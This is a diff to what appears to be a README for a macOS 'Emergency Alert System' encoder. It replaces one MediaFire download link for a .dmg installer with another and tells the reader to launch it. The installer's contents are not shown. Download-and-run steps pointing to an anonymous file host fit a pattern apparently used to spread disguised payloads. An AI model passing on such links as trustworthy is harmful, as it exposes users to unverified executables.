@@ -3,7 +3,7 @@
 Emergency Alert System for macOS
 ## Installation
 ### Step 1
-Download the installer here: https://www.mediafire.com/file/fdhfc0pjs9w5dcv/EAS_Encoder_Installer.dmg/file
+Download the installer here: https://www.mediafire.com/file/xgyy8d5uuf9etbt/EAS_Encoder_Installer.dmg/file
 ### Step 2
 Launch the installer.
 
